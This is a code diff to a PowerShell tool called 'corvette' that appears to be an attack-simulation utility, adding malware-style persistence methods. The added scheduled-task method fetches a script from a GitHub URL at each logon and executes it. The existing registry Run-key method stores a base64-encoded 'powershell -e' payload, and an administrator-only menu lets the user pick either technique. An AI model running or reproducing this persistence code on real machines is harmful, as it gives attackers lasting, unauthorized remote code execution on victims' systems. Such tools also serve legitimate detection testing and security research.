@@ -4810,7 +4810,7 @@ class HighRiskToolsAndCommands : CommandBase {
     HighRiskToolsAndCommands([Properties]$props) : base($props) {
     }
 
-    hidden [void]EstablishPersistence() {
+    hidden [void]EstablishPersistenceAutoRun() {
         $path = "HKCU:\SOFTWARE\Microsoft\Windows\CurrentVersion\Run"
         $name = "corvette"
         $ret = Get-ItemProperty $path -name $name -ErrorAction SilentlyContinue
@@ -4823,6 +4823,57 @@ class HighRiskToolsAndCommands : CommandBase {
             $script_b64 = GetEncodedCorvetteDynamicLoaderScript
             $reg = New-ItemProperty -Force -Path $path -Name $name -Value "powershell -e $script_b64"
             Write-Host "Persistence was achieved to ensure that 'corvette' runs on system startup at:`n  -> $path"
+        }
+    }
+
+    hidden [void]EstablishPersistenceScheduledTask() {
+        $cargs = @(
+            "/create",
+            "/f",
+            "/it",
+            "/tn", "corvette",
+            "/sc", "onlogon",
+            "/tr", @"
+"powershell -c '& ([ScriptBlock]::Create([Net.WebClient]::New().DownloadString(\\\"https://github.com/spearmin10/corvette/blob/main/corvette.ps1?raw=true\\\")))'"
+"@
+        )
+
+        Start-Process -FilePath schtasks -ArgumentList $cargs -Wait -NoNewWindow -WorkingDirectory $this.props.home_dir
+    }
+
+    hidden [void]EstablishPersistence() {
+        $current = New-Object Security.Principal.WindowsPrincipal([Security.Principal.WindowsIdentity]::GetCurrent())
+        if ($current.IsInRole([Security.Principal.WindowsBuiltInRole]::Administrator)) {
+            while ($true) {
+                Write-Host "************************************"
+                Write-Host " 1) Set HKCU:\SOFTWARE\Microsoft\Windows\CurrentVersion\Run"
+                Write-Host " 2) Set a Scheduled Task"
+                Write-Host " q) Exit"
+                try {
+                    :retry do {
+                        $cmd = Read-Host "Please choose a menu item"
+                        switch ($cmd) {
+                            "q" {
+                                return
+                            }
+                            "1" {
+                                $this.EstablishPersistenceAutoRun()
+                            }
+                            "2" {
+                                $this.EstablishPersistenceScheduledTask()
+                            }
+                            default {
+                                continue retry
+                            }
+                        }
+                        break
+                    } while($true)
+                } catch {
+                    Write-Host $_
+                }
+            }
+        } else {
+            $this.EstablishPersistenceAutoRun()
         }
     }
 
